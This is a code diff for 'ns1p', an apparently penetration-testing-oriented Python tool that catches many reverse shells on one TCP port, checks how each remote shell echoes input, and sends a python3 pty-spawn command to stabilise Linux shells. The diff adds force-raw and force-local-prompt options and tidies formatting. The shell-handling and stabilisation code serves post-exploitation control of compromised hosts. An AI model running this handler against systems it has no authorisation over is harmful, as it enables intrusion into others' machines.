@@ -3,10 +3,7 @@
 import sys
 import os
 import traceback
-import time
 import termios
-import tty
-import select
 import argparse
 import collections
 import asyncio
@@ -17,10 +14,9 @@ from prompt_toolkit.key_binding import KeyBindings as PromptKeyBindings
 from prompt_toolkit.patch_stdout import patch_stdout as prompt_patch_stdout
 from prompt_toolkit import print_formatted_text as prompt_print_formatted_text, ANSI as PromptANSI
 
-import textual
-from textual import events
 from textual.app import App, ComposeResult
 from textual.widgets import Static, ListView, ListItem, Label, RichLog
+
 
 class ShellSession:
     def __init__(self, session_id, name, reader, writer, local_prompt_mode=False):
@@ -32,6 +28,7 @@ class ShellSession:
         self.read_deque = collections.deque()
         self.ready = False
         self.history_deque = collections.deque()
+
 
 class NShellsOnePortApp(App):
     """Accepts N reverse shell on one tcp port"""
@@ -102,7 +99,7 @@ class NShellsOnePortApp(App):
                             prompt_print_formatted_text(PromptANSI(data))
                         except IndexError:
                             pass
-                        await asyncio.sleep(0) #yield to event loop
+                        await asyncio.sleep(0) # yield to event loop
 
                     # cancel prompt
                     self.prompt_session.app.exit()
@@ -146,7 +143,7 @@ class NShellsOnePortApp(App):
                             # stdin read is non blocking because we disabled Canonical Mode and set VMIN=VTIME=0
                             b = sys.stdin.buffer.read(1)
                             if len(b) > 0:
-                                if b == b'\x02': #STX aka Ctrl-B
+                                if b == b'\x02': # STX aka Ctrl-B
                                     self.menu = True
                                 else:
                                     session.writer.write(b)
@@ -165,6 +162,10 @@ class NShellsOnePortApp(App):
         self.log_view.write("Use the enter key to interact with a session")
         self.log_view.write("You can bring up this menu at any time by pressing Ctrl-B")
         self.log_view.write("")
+        if self.config.force_raw_mode:
+            self.log_view.write("[*] Force raw mode enabled!")
+        elif self.config.force_local_prompt_mode:
+            self.log_view.write("[*] Force local prompt mode enabled!")
         self.run_worker(self.master_server(self.config.ip, self.config.port))
 
     async def update_session_list_view(self) -> None:
@@ -175,6 +176,7 @@ class NShellsOnePortApp(App):
     async def rshell_client(self, reader, writer) -> None:
         async def read_stream(reader, timeout=.2):
             res = b""
+
             async def read_all():
                 nonlocal res
                 while True:
@@ -199,7 +201,7 @@ class NShellsOnePortApp(App):
                 self.session_list.append(session)
             await self.update_session_list_view()
             self.log_view.write(f"[*] New session {session_name}")
-    
+
             async def shell_feature_check():
                 self.log_view.write(f"[*] Session {session_id}: Initiating shell_feature_check")
                 writer.write(b"\n\n\n")
@@ -226,7 +228,6 @@ class NShellsOnePortApp(App):
                 else:
                     self.log_view.write(f"[*] Session {session_id}: Reverse shell does NOT live-echo inputs")
 
-
                 if not immediate_execution:
                     writer.write(b"\n")
                     await writer.drain()
@@ -234,7 +235,7 @@ class NShellsOnePortApp(App):
 
                     if not data:
                         self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with no response)")
-                    elif not stdin_live_echo and b"ns1p" in data and not b"echo ns1p" in data:
+                    elif not stdin_live_echo and b"ns1p" in data and b"echo ns1p" not in data:
                         self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo commands but doesn't echo inputs")
                         command_echo = True
                     elif b"echo ns1p" in data and data.count(b"ns1p") >= 2:
@@ -245,7 +246,7 @@ class NShellsOnePortApp(App):
                             # cmd.exe and powershell echos the command only after pressing enter
                         else:
                             self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo commands and echos inputs live AND after sending newline")
-                    elif stdin_live_echo and data.count(b"ns1p") >= 1: #theoretically we should check == 1 but the count might be higher from e.g. PS1
+                    elif stdin_live_echo and data.count(b"ns1p") >= 1: # theoretically we should check == 1 but the count might be higher from e.g. PS1
                         self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo commands and live-echos inputs")
                         command_echo = True
                     else:
@@ -258,7 +259,7 @@ class NShellsOnePortApp(App):
                 await writer.drain()
                 # ignore any potential echoing
                 await read_stream(reader)
- 
+
                 # send Ctrl-C
                 writer.write(b"\x03")
                 await writer.drain()
@@ -281,22 +282,25 @@ class NShellsOnePortApp(App):
                 self.log_view.write(f"[*] Session {session_id}: shell_feature_check concluded. Result (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution) = {(stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution)}")
                 return (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution)
 
-            (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution) = await shell_feature_check()
-            # this check in its current form does not stabilize on a pure bash reverse shell => no Ctrl-C
-            # it also attempts to linux stabilize a windows shell (although this doesnt break anything)
-            if immediate_execution:
-                # input is executed by the remote immediately after receiving => local_prompt_mode required
+            if self.config.force_raw_mode:
+                session.local_prompt_mode = False
+            elif self.config.force_local_prompt_mode:
                 session.local_prompt_mode = True
-                self.log_view.write(f"[*] Session {session_id}: local prompt mode enabled")
-            elif command_echo and not (stdin_live_echo and ctrl_c) and not stdin_late_echo:
-                self.log_view.write(f"[*] Session {session_id}: Attempting auto-stabilization using linux python3 payload")
-                writer.write(b"exec python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
-                await writer.drain()
+            else:
                 (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution) = await shell_feature_check()
-            elif command_echo and stdin_late_echo and not (stdin_live_echo or ctrl_c):
-                # this is most likely a windows shell with only late echo => local_prompt_mode preferred to not type blind
-                session.local_prompt_mode = True
-                self.log_view.write(f"[*] Session {session_id}: local prompt mode enabled")
+                if immediate_execution:
+                    # input is executed by the remote immediately after receiving => local_prompt_mode required
+                    session.local_prompt_mode = True
+                    self.log_view.write(f"[*] Session {session_id}: local prompt mode enabled")
+                elif command_echo and not (stdin_live_echo and ctrl_c) and not stdin_late_echo:
+                    self.log_view.write(f"[*] Session {session_id}: Attempting auto-stabilization using linux python3 payload")
+                    writer.write(b"exec python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
+                    await writer.drain()
+                    (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution) = await shell_feature_check()
+                elif command_echo and stdin_late_echo and not (stdin_live_echo or ctrl_c):
+                    # this is most likely a windows shell with only late echo => local_prompt_mode preferred to not type blind
+                    session.local_prompt_mode = True
+                    self.log_view.write(f"[*] Session {session_id}: local prompt mode enabled")
 
             # send a final newline to print PS1 again
             writer.write(b"\n")
@@ -311,7 +315,7 @@ class NShellsOnePortApp(App):
                     if not data:
                         break
                     session.read_deque.append(data)
-        
+
                 self.log_view.write(f"[*] Session {session_name} closed")
                 writer.close()
                 await writer.wait_closed()
@@ -325,13 +329,14 @@ class NShellsOnePortApp(App):
 
         except Exception as e:
             self.log_view.write(f"[-] Exception in rshell_client {e}\n{traceback.format_exc()}")
-    
+
     async def master_server(self, host, port):
         server = await asyncio.start_server(self.rshell_client, host, port)
         addr = server.sockets[0].getsockname()
         self.log_view.write(f"[*] Listening on {addr}")
         async with server:
             await server.serve_forever()
+
 
 class RawStdin:
     def __enter__(self):
@@ -340,11 +345,10 @@ class RawStdin:
 
         new_attributes = termios.tcgetattr(self.fd)
 
-    
-        #tty.cfmakeraw(new_attributes)
+        # tty.cfmakeraw(new_attributes)
         # tty.cfmakeraw is only in python >=3.12
         # do it manually
-        new_attributes[0] &= ~(termios.IGNBRK | termios.BRKINT | termios.PARMRK | termios.ISTRIP | termios.INLCR | termios.IGNCR | termios.ICRNL | termios.IXON)        
+        new_attributes[0] &= ~(termios.IGNBRK | termios.BRKINT | termios.PARMRK | termios.ISTRIP | termios.INLCR | termios.IGNCR | termios.ICRNL | termios.IXON)
         new_attributes[1] &= ~termios.OPOST
         new_attributes[2] &= ~(termios.CSIZE | termios.PARENB)
         new_attributes[2] |= termios.CS8
@@ -358,10 +362,14 @@ class RawStdin:
     def __exit__(self, exc_type, exc_val, exc_tb):
         termios.tcsetattr(self.fd, termios.TCSANOW, self.old_attributes)
 
+
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(prog='ns1p', description='Accepts N reverse shell on one tcp port"', epilog='Created by B0nk3rZ')
     parser.add_argument('-i', '--ip', type=str, default='0.0.0.0', help='The IP address to listen on')
     parser.add_argument('-p', '--port', type=int, default=4444, help='The port to listen on')
+    modegroup = parser.add_mutually_exclusive_group()
+    modegroup.add_argument('-r', '--force-raw-mode', action='store_true', help='Disable shell feature checks and force all shells to be in raw mode')
+    modegroup.add_argument('-l', '--force-local-prompt-mode', action='store_true', help='Disable shell feature checks and force all shells to be in local prompt mode')
     args = parser.parse_args()
     NShellsOnePortApp(config=args).run()
 
